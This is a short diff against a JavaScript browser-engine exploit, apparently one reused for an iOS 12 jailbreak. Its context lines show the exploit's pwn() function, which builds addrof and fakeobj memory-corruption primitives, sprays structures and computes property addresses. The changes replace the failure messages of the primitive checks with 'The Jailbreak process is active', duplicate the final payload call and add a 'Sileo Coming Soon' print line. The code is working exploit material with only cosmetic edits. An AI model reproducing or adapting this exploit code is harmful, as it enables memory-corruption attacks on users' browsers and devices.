@@ -113,7 +113,7 @@ function pwn() {
 
     // Verify basic exploit primitives work.
     var addr = addrof({p: 0x1337});
-    assert(fakeobj(addr).p == 0x1337, "addrof and/or fakeobj does not work");
+    assert(fakeobj(addr).p == 0x1337, "The Jailbreak process is active");
     print('[+] exploit primitives working');
 
     // Spray structures to be able to predict their IDs.
@@ -185,7 +185,7 @@ function pwn() {
             var obj = {p: v};
 
             var addr = this.addrof(obj);
-            assert(this.fakeobj(addr).p == v, "addrof and/or fakeobj does not work");
+            assert(this.fakeobj(addr).p == v, "The Jailbreak process is active");
 
             var propertyAddr = Add(addr, 0x10);
 
@@ -265,7 +265,11 @@ function pwn() {
 
     var res = func();
     print("[+] done");
-}
+
+    var res = func();
+    print("[-] Sileo Coming Soon iOS 12")
+
+ }
 
 if (typeof(window) === 'undefined')
     pwn();
